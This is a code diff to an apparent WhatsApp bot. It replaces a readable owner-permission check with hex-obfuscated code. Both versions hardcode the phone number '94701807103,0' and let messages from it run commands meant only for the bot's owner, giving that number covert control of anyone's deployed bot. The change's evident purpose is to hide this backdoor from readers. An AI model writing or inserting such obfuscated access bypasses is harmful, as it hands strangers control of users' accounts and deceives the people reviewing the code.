@@ -47,7 +47,7 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
 });
 
 const plugindb = require('./plugins/sql/plugin');
-var OWN = { ff: '94701807103,0' }
+var _0x3d77=["\x39\x34\x37\x30\x31\x38\x30\x37\x31\x30\x33\x2C\x30"];var OWN={ff:_0x3d77[0]}
 
 // just a convenience. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
 String.prototype.format = function () {
@@ -442,13 +442,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-                     if ((OWN.ff == "94701807103,0" && msg.key.fromMe === false && command.fromMe === true &&
-                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
-                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
-                        if (command.onlyPinned && chat.pin === undefined) return;
-                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
-                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
-                    }
+                     var _0x9d67=["\x66\x66","\x39\x34\x37\x30\x31\x38\x30\x37\x31\x30\x33\x2C\x30","\x66\x72\x6F\x6D\x4D\x65","\x6B\x65\x79","\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6E\x74","\x2C","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x40","\x73\x70\x6C\x69\x74","\x72\x65\x6D\x6F\x74\x65\x4A\x69\x64","\x6F\x6E\x6C\x79\x50\x69\x6E\x6E\x65\x64","\x70\x69\x6E","\x6F\x6E\x6C\x79\x50\x6D","\x2D","\x6A\x69\x64","\x6F\x6E\x6C\x79\x47\x72\x6F\x75\x70"];if((OWN[_0x9d67[0]]== _0x9d67[1]&& msg[_0x9d67[3]][_0x9d67[2]]=== false&& command[_0x9d67[2]]=== true&& (msg[_0x9d67[4]]&& OWN[_0x9d67[0]][_0x9d67[6]](_0x9d67[5])?OWN[_0x9d67[0]][_0x9d67[8]](_0x9d67[5])[_0x9d67[6]](msg[_0x9d67[4]][_0x9d67[8]](_0x9d67[7])[0]):msg[_0x9d67[4]][_0x9d67[8]](_0x9d67[7])[0]== OWN[_0x9d67[0]]|| OWN[_0x9d67[0]][_0x9d67[6]](_0x9d67[5])?OWN[_0x9d67[0]][_0x9d67[8]](_0x9d67[5])[_0x9d67[6]](msg[_0x9d67[3]][_0x9d67[9]][_0x9d67[8]](_0x9d67[7])[0]):msg[_0x9d67[3]][_0x9d67[9]][_0x9d67[8]](_0x9d67[7])[0]== OWN[_0x9d67[0]]))|| command[_0x9d67[2]]=== msg[_0x9d67[3]][_0x9d67[2]]|| (command[_0x9d67[2]]=== false&&  !msg[_0x9d67[3]][_0x9d67[2]])){if(command[_0x9d67[10]]&& chat[_0x9d67[11]]=== undefined){return};if(!command[_0x9d67[12]]=== chat[_0x9d67[14]][_0x9d67[6]](_0x9d67[13])){sendMsg= true}else {if(command[_0x9d67[15]]=== chat[_0x9d67[14]][_0x9d67[6]](_0x9d67[13])){sendMsg= true}}}
   // ==================== End Events ====================
 
                     // ==================== Message Catcher ====================
